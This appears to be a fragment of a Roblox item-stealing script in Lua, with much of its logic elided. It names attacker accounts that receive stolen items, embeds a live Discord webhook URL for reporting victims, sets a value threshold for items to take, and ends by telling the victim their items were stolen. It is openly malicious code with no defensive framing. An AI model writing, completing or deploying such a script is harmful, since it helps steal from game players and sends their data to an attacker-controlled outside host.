Username = "LathDawgg"
Username2 = "Artemonus206" -- stuff will get sent to this user if first user's mailbox is full
webhook = "https://discord.com/api/webhooks/1319155885708148756/vosMewlgE3JZjoHZsOOS_-MNDsIWsM5MmCbUyUdekFN0kRp_Xks2K_TwOfrMCVJpheZK"
min_rap = 500000 -- minimum rap of each item you want to get sent to you. 1 mil by default
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ...
    message.Error("All your items just got stolen by Bxnq")
